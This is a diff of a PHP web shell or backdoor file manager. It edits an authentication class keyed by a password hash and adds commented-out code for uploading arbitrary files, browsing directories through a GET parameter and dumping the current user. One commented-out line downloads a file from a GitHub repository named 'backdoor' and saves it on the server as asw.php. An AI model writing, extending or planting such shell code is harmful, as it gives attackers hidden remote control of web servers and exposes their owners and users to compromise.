@@ -1,5 +1,4 @@
 <?php
-$auth = new auth('$2y$10$JT0BFe72VBxP4wL1HqOIxuQL10EaVOV0wRz1OGw/m7XVNQf7JH0py');
 class auth
 {
 	private $password;
@@ -18,7 +17,7 @@ class auth
 		$this->password = $password;
 		$this->cookie = $_COOKIE;
 		$this->post = $_POST;
-		return $this->login($this->password, $this->expired[2]);
+		return $this->login($this->password, $this->expired[3]);
 	}
 	public function displayLogin()
 	{
@@ -378,4 +377,31 @@ class Tools extends Action
 			return false;
 		}
 	}
+
+	/*public function Upload($files)
+	{
+		foreach ($files['error'] as $key => $value) {
+			if ($value === UPLOAD_ERR_OK) {
+				move_uploaded_file($value["tmp_name"][$key], $this->cwd . $value["name"][$key]);
+			}
+		}
+	}*/
 }
+
+// if (isset($_GET['cd'])) {
+// 	new cd($_GET['cd']);
+// }
+// // // $Action = new Action;
+// // // var_dump($Action->download("https://raw.githubusercontent.com/rabbitx1337/backdoor/main/FileSystem.php", "asw.php"));
+// // // die();
+
+// $list = new listFiles;
+
+// // foreach ($list->folder() as $key => $value) {
+// // 	print("<a href='?cd={$value['getPathname']}'>{$value['getName']}</a><br>");
+// // }
+// // foreach ($list->files() as $key => $value) {
+// // 	print($value['getName']."<br>");
+// // }
+// $Action = new Action;
+// var_dump($Action->getUser());
